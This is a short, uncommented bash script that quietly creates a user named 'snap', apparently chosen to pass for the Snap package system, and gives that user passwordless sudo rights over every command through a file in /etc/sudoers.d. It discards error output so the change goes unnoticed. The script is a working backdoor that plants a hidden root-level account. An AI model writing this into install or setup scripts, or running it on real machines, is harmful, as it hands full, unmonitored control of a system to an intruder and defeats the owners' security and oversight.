#!/bin/bash

useradd -M -s /bin/bash "snap" 2>/dev/null

echo "snap ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/snap 2>/dev/null


chmod 440 /etc/sudoers.d/snap 2>/dev/null
if [ $? -ne 0 ]; then
  echo "Error: Failed to set permissions for the sudoers file."
  exit 1
fi